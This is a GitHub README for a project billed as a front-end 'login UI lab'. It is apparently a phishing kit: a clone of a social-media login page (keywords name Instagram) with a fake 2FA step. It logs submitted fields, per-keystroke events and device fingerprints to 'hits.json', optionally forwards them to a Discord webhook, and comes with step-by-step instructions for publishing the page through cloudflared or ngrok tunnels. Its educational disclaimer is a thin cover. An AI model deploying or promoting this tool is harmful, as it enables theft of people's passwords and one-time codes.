<p align="center">
  <img src="assets/logo.svg" width="128" alt="Login UI Lab">
</p>

<h1 align="center">Login UI Lab</h1>

<p align="center">
  <b>Pixel-accurate social login UI + zero-dependency Node server</b><br>
  Windows · macOS · Linux · Termux · iSH · instant public tunnels
</p>

<p align="center">
  <img alt="Node" src="https://img.shields.io/badge/node-%3E%3D18-brightgreen?style=for-the-badge&logo=node.js&logoColor=white">
  <img alt="Platforms" src="https://img.shields.io/badge/platforms-Win%20%7C%20Mac%20%7C%20Linux%20%7C%20Android%20%7C%20iOS-blue?style=for-the-badge">
  <img alt="Deps" src="https://img.shields.io/badge/dependencies-0-success?style=for-the-badge">
  <img alt="License" src="https://img.shields.io/badge/license-MIT-blue?style=for-the-badge">
  <a href="https://github.com/zenzemie/login-ui-lab/stargazers"><img alt="Stars" src="https://img.shields.io/github/stars/zenzemie/login-ui-lab?style=for-the-badge"></a>
  <a href="https://github.com/zenzemie/login-ui-lab/network/members"><img alt="Forks" src="https://img.shields.io/github/forks/zenzemie/login-ui-lab?style=for-the-badge"></a>
</p>

---

## What is this?

A **working** recreation of a modern social login screen (floating labels, responsive layout, confirmation step) plus a single-file Node server that:

- serves the UI
- accepts form / live field events
- stores events locally (`hits.json`)
- optionally notifies Discord via env webhook
- runs on **every** common platform with Node installed

Perfect for front-end practice, UX study, demos, and local labs behind Cloudflare Tunnel or ngrok.

---

## Features

| Feature | Detail |
|--------|--------|
| Pixel-close UI | Floating labels, show/hide password, real footer links, desktop phone mock |
| Zero deps | Plain Node `http` — no Express, no npm install required |
| Live telemetry | Optional per-keystroke events + device fingerprint fields |
| 2-step flow | `/2fa.html` confirmation page |
| Cross-platform | Windows · macOS · Linux · Termux · iSH |
| Instant public link | cloudflared / ngrok one-liners |
| Optional notify | `DISCORD_WEBHOOK` environment variable |

---

## Quick start (all platforms)

**Requirement:** [Node.js 18+](https://nodejs.org/) (LTS recommended)

```bash
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

Open **http://127.0.0.1:8080**

### Public HTTPS link (free)

```bash
# Cloudflare Tunnel (no account required for quick tunnels)
cloudflared tunnel --url http://127.0.0.1:8080

# or ngrok
ngrok http 8080
```

### Optional Discord notify

```bash
# Linux / macOS / Termux / iSH
export DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
node server.js

# Windows PowerShell
$env:DISCORD_WEBHOOK="https://discord.com/api/webhooks/..."
node server.js

# Windows CMD
set DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
node server.js
```

---

## Platform guides

### Windows

1. Install [Node.js LTS](https://nodejs.org/)
2. Optional: [cloudflared](https://developers.cloudflare.com/cloudflare-one/connections/connect-apps/install-and-setup/installation/) or [ngrok](https://ngrok.com/download)
3. PowerShell / CMD:

```powershell
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

Or double-click `start-windows.bat`

### macOS

```bash
brew install node cloudflared   # or download Node from nodejs.org
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
# public:
cloudflared tunnel --url http://127.0.0.1:8080
```

Or run `chmod +x start.sh && ./start.sh`

### Linux

```bash
# Debian/Ubuntu
sudo apt update && sudo apt install -y nodejs npm
# or use NodeSource / nvm for newer Node

git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

### Termux (Android)

```bash
pkg install nodejs cloudflared git
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js &
cloudflared tunnel --url http://127.0.0.1:8080
```

### iSH (iPhone / iPad)

```bash
apk add nodejs npm git
git clone https://github.com/zenzemie/login-ui-lab.git
cd login-ui-lab
node server.js
```

Keep iSH open. For tunnels, ngrok or a second device is often easier.

---

## Project structure

```
login-ui-lab/
├── index.html          # main login UI
├── 2fa.html            # confirmation step
├── server.js           # zero-dep server
├── start.sh            # Unix helper
├── start-windows.bat   # Windows helper
├── assets/logo.svg
├── SETUP.md
├── cat.md
└── LICENSE
```

---

## API (local server)

| Path | Method | Purpose |
|------|--------|--------|
| `/` | GET | Login UI |
| `/2fa.html` | GET | Confirmation UI |
| `/collect` | POST | JSON events |
| `/list` | GET | Recent stored events |

---

## Keywords / discoverability

`instagram login ui` · `login page clone` · `pixel perfect login` · `termux node server` · `ish node` · `cloudflared tunnel` · `ngrok demo` · `zero dependency node http` · `floating label form` · `frontend practice` · `social login mock` · `2fa ui demo`

---

## Disclaimer

Built for **education, front-end practice, and local demos**. Run on machines and networks you control. Do not target accounts or systems you do not own.

---

## License

MIT © 2026 [zenzemie](https://github.com/zenzemie)
